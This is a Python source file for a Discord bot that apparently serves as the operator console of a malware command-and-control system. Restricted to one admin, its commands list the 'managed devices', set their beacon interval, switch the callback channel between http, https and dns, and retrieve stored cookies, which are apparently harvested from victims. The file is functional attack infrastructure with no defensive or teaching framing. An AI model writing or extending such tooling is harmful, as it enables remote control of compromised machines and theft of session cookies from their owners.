"""
Discord bot entry point.
Registers commands and enforces admin-only access control.
"""

import discord
from discord.ext import commands

from config import DISCORD_BOT_TOKEN, ADMIN_DISCORD_ID, COMMAND_PREFIX
from devices import DeviceManager

# ---------------------------------------------------------------------------
# Bot setup
# ---------------------------------------------------------------------------

intents = discord.Intents.default()
intents.message_content = True

bot = commands.Bot(command_prefix=COMMAND_PREFIX, intents=intents)
device_manager = DeviceManager()


# ---------------------------------------------------------------------------
# Access control
# ---------------------------------------------------------------------------

def is_admin(ctx: commands.Context) -> bool:
    """Check whether the command author is the authorised admin."""
    return ctx.author.id == ADMIN_DISCORD_ID


# ---------------------------------------------------------------------------
# Events
# ---------------------------------------------------------------------------

@bot.event
async def on_ready() -> None:
    """Log a message when the bot successfully connects to Discord."""
    print(f"Bot connected as {bot.user} (ID: {bot.user.id})")  # type: ignore[union-attr]
    print("Waiting for commands...")


@bot.event
async def on_command_error(ctx: commands.Context, error: commands.CommandError) -> None:
    """Global error handler for command errors."""
    if isinstance(error, commands.CheckFailure):
        await ctx.send("🚫 **Access denied.** You are not authorised to use this bot.")
    elif isinstance(error, commands.MissingRequiredArgument):
        await ctx.send(f"⚠️ Missing required argument: `{error.param.name}`.")
    elif isinstance(error, commands.BadArgument):
        await ctx.send("⚠️ Invalid argument type. Please check the command usage.")
    elif isinstance(error, commands.CommandNotFound):
        await ctx.send("❓ Unknown command. Use `!help` to see available commands.")
    else:
        await ctx.send("💥 An unexpected error occurred.")
        raise error


# ---------------------------------------------------------------------------
# Commands
# ---------------------------------------------------------------------------

@bot.command(name="show-devices", help="Display all managed devices and their status.")
@commands.check(is_admin)
async def show_devices(ctx: commands.Context) -> None:
    """Send the list of managed devices to the channel."""
    response = device_manager.show_devices()
    await ctx.send(response)


@bot.command(
    name="set-beacon-interval",
    help="Set the beacon interval. Valid values: 2, 8, 16, 32.",
)
@commands.check(is_admin)
async def set_beacon_interval(ctx: commands.Context, interval: int) -> None:
    """Set the beacon interval to the provided value."""
    response = device_manager.set_beacon_interval(interval)
    await ctx.send(response)


@bot.command(name="request-cookies", help="Display all stored cookies.")
@commands.check(is_admin)
async def request_cookies(ctx: commands.Context) -> None:
    """Send the current cookie list to the channel."""
    response = device_manager.request_cookies()
    await ctx.send(response)


@bot.command(
    name="set-communication-protocol",
    help="Set the communication protocol. Valid values: http, https, dns.",
)
@commands.check(is_admin)
async def set_communication_protocol(ctx: commands.Context, protocol: str) -> None:
    """Set the communication protocol to the provided value."""
    response = device_manager.set_communication_protocol(protocol)
    await ctx.send(response)


# ---------------------------------------------------------------------------
# Entry point
# ---------------------------------------------------------------------------

if __name__ == "__main__":
    bot.run(DISCORD_BOT_TOKEN)
